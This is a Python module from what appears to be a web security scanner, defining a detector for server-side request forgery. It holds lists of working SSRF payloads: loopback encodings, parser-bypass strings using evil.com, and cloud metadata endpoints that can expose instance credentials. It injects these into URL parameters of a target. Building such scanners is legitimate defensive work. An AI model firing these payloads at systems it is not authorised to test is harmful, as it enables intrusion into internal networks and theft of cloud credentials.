"""
SSRF (Server-Side Request Forgery) Vulnerability Scanner
Detects SSRF vulnerabilities through various protocols and bypass techniques
"""
import re
import urllib.parse
from app.scanner.base import BaseScanner
from app.core.http_client import get_client


class SSRFDetector(BaseScanner):
    name = "SSRF服务端请求伪造漏洞"
    description = "检测目标是否存在SSRF漏洞，攻击者可利用该漏洞访问内网资源或进行端口扫描"
    category = "ssrf"
    module = "ssrf_detector"
    risk_level = "high"
    risk_score = 75
    cve_ids = []
    references = [
        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
        "https://portswigger.net/web-security/ssrf",
    ]
    fix_suggestion = "实施URL白名单验证，禁用不必要的URL协议，限制内网地址访问，使用DNS解析过滤。"

    SSRF_PAYLOADS = [
        "http://127.0.0.1:80",
        "http://localhost:80",
        "http://0.0.0.0:80",
        "http://[::1]:80",
        "http://0177.0.0.1:80",
        "http://2130706433:80",
        "http://0x7f.0x0.0x0.0x1:80",
        "http://127.1:80",
        "http://127.0.0.1.nip.io:80",
        "http://localhost.localdomain:80",
    ]

    SSRF_BYPASS_PAYLOADS = [
        "http://127.0.0.1:80@evil.com",
        "http://evil.com@127.0.0.1:80",
        "http://evil.com#@127.0.0.1:80",
        "http://127.0.0.1:80%23@evil.com",
        "http://127.0.0.1:80%00@evil.com",
        "http://localhost:80%00.evil.com",
        "http://127.0.0.1:80%23.evil.com",
        "http://127.0.0.1:80%0d%0a",
        "http://127.0.0.1:80%0a",
        "http://127.0.0.1:80%09",
    ]

    CLOUD_METADATA_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://metadata.tencentyun.com/latest/meta-data/",
    ]

    def __init__(self, target: str):
        super().__init__(target)
        self._client = get_client()

    def _inject_payload(self, url: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            injected = {}
            for key in params:
                if any(kw in key.lower() for kw in ["url", "link", "src", "path", "redirect", "uri", "file", "page", "fetch", "proxy", "api", "callback", "webhook", "endpoint", "target", "host", "domain", "dest", "goto", "return", "next"]):
                    injected[key] = [payload]
                else:
                    injected[key] = params[key]
            if any(k for k in injected if injected[k] == [payload]):
                new_query = urllib.parse.urlencode(injected, doseq=True)
                return urllib.parse.urlunparse(parsed._replace(query=new_query))
        return f"{url}?url={urllib.parse.quote(payload)}"

    def check(self) -> bool:
        found_any = False

        all_payloads = self.SSRF_PAYLOADS + self.SSRF_BYPASS_PAYLOADS

        for payload in all_payloads[:10]:
            try:
                injected_url = self._inject_payload(self.target, payload)
                resp = self._client.get(injected_url, timeout=8)
                if resp.status and resp.body:
                    text = resp.body.decode("utf-8", errors="replace")
                    indicators = [
                        "root:", "nginx", "apache", "iis", "localhost",
                        "welcome to", "index of", "directory listing",
                        "it works", "test page", "default page",
                    ]
                    for indicator in indicators:
                        if indicator.lower() in text.lower():
                            found_any = True
                            self.add_result(
                                name="SSRF服务端请求伪造漏洞",
                                target_url=self.target,
                                description="检测到SSRF漏洞，服务器端会请求攻击者指定的URL，可能导致内网探测或敏感信息泄露。",
                                detail=f"Payload: {payload}\n响应包含内网服务特征: {indicator}",
                                payload=payload,
                                evidence=text[:500],
                            )
                            return True
            except Exception:
                continue

        for payload in self.CLOUD_METADATA_PAYLOADS:
            try:
                injected_url = self._inject_payload(self.target, payload)
                resp = self._client.get(injected_url, timeout=8)
                if resp.status and resp.body:
                    text = resp.body.decode("utf-8", errors="replace")
                    if any(kw in text for kw in ["ami-id", "instance-id", "security-groups", "public-keys"]):
                        found_any = True
                        self.add_result(
                            name="SSRF漏洞 - 云元数据泄露",
                            target_url=self.target,
                            description="检测到SSRF漏洞可访问云平台元数据服务，可能导致云凭证泄露。",
                            detail=f"Payload: {payload}\n成功读取云元数据。",
                            payload=payload,
                            evidence=text[:500],
                        )
                        return True
            except Exception:
                continue

        return found_any
